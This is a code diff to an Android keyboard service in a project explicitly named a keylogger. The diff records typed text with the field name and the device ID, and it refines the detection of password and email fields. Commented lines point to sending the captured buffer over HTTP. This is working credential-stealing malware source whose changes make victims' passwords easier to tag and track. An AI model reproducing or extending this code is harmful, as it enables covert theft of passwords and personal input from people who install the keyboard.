@@ -1,11 +1,11 @@
 package com.example.keyboard_keylogger;
 
-
 import android.graphics.Bitmap;
 import android.inputmethodservice.InputMethodService;
 import android.inputmethodservice.Keyboard;
 import android.inputmethodservice.KeyboardView;
 import android.os.Environment;
+import android.provider.Settings;
 import android.text.InputType;
 import android.util.Base64;
 import android.view.KeyEvent;
@@ -39,18 +39,21 @@ public class MyService extends InputMethodService implements KeyboardView.OnKeyb
 //        System.out.println(keyBuffer);
 //        String jsonInputString = "{\"slova\": "+keyBuffer+" }";
 //        new HTTPReqTask().setBody(jsonInputString).execute();
+        String android_id = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);
         JSONObject obj = new JSONObject();
         int inputType = getCurrentInputEditorInfo().inputType;
         String fieldName = getCurrentInputEditorInfo().fieldName;
         System.out.println(inputType);
-        System.out.println(fieldName);
+        System.out.println(determineInputType(inputType));
 
         String text = getStringRepresentation(keyBuffer);
         try {
             obj.put("text",text);
             obj.put("inputType",determineInputType(inputType));
             obj.put("fieldName",fieldName);
-//            obj.put("photo",slika);
+            obj.put("id",android_id);
+
+            //            obj.put("photo",slika);
         } catch (JSONException e) {
             e.printStackTrace();
         }
@@ -141,13 +144,8 @@ public class MyService extends InputMethodService implements KeyboardView.OnKeyb
         return builder.toString();
     }
     private String determineInputType(int inputType){
-        if ((inputType & InputType.TYPE_CLASS_PHONE) != 0) return "Phone";
-        if ((inputType & InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS) != 0) return "Email";
-        if ((inputType & InputType.TYPE_TEXT_VARIATION_PASSWORD) != 0) return "Password";
-
-
-
-
+        if (InputTypeUtils.isPasswordInputType(inputType) || InputTypeUtils.isVisiblePasswordInputType(inputType)) return "Password";
+        if (InputTypeUtils.isEmailVariation(inputType)) return "Email";
         return "Text";
     }
 
